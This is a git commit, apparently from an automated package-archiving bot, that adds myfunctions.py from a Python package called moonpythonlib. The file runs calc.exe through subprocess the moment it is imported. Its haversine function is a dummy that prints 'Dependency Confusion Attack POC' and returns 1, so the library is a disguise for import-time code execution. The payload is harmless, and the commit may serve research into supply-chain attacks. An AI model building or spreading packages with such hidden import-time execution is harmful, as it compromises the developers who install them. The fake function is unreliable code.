41ef038a158e63cea8f1c83f224e46c9820e891b
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 02:26:05 +0000

    Add package moonpythonlib/0.1.4/moonpythonlib-0.1.4-py3-none-any.whl

---
+++ packages/moonpythonlib/moonpythonlib-0.1.4-py3-none-any.whl/moonpythonlib/myfunctions.py
@@ -0,0 +1,7 @@
+from subprocess import call
+# This is excuted when this file is imported.
+call(["calc.exe"])
+
+def haversine(lon1: float, lat1: float, lon2: float, lat2: float) -> float:
+    print("Dependency Confusion Attack POC")
+    return 1
